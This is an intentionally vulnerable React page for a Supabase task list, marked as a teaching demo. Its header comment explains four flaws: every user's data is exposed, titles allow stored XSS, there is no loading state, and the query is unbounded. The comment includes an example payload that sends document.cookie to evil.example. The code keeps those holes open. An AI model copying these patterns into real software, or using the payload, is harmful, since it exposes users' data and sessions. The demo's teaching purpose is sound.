// ❌ BROKEN (deliberate demo) — see docs/RESCUE-REPORT.md #2, #4, #7, #9
//
// What's wrong here:
//   #2 — No auth check and no Row Level Security: this query returns EVERY
//        user's tasks. One visitor sees everyone's data.
//   #4 — Task titles are rendered with dangerouslySetInnerHTML. A task titled
//        `<img src=x onerror="fetch('https://evil.example?c='+document.cookie)">`
//        runs JavaScript in every visitor's browser (stored XSS).
//   #7 — No loading state, no error handling: visitors stare at a blank page
//        while this loads, and get a crash if it fails.
//   #9 — Unbounded query: .select("*") with no limit/pagination. At 10k tasks
//        this page falls over.

import { supabase } from "../../lib/supabase-broken";

interface BrokenTask {
  id: string;
  title: string;
  done: boolean;
}

export default async function BrokenTasksPage() {
  // ❌ #2 + #9: everyone's tasks, all rows, no limit, no RLS.
  const { data: tasks } = await supabase.from("tasks").select("*");

  return (
    <div>
      <h1>Tasks</h1>
      {/* ❌ #7: nothing renders until this resolves — no skeleton, no spinner. */}
      <ul>
        {(tasks as BrokenTask[] | null)?.map((t) => (
          <li key={t.id}>
            {/* ❌ #4: raw HTML from the database, executed in the browser. */}
            <span dangerouslySetInnerHTML={{ __html: t.title }} />
            {t.done ? " ✓" : ""}
          </li>
        ))}
      </ul>
    </div>
  );
}
